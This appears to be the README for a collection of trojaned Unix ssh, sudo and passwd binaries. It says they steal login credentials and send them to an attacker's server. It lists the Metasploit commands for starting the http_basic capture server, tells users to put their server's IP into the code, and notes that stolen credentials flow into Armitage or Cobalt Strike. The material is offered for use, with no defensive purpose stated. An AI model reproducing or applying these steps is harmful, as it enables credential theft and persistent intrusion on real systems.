Nix Backdoors
=============
ssh, sudo, and passwd

Steals creds and sends them to the http_basic server in metasploit:
<b>
msf > use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) > set URIPATH /
msf auxiliary(http_basic) > run
</b>

Make sure to replace metasploit.http.serv.ip in the code with the ip that the server is running on
Creds will automatically be imported into the cred database of an Armitage or Cobalt Strike server
passwd is by far the most complex and effective
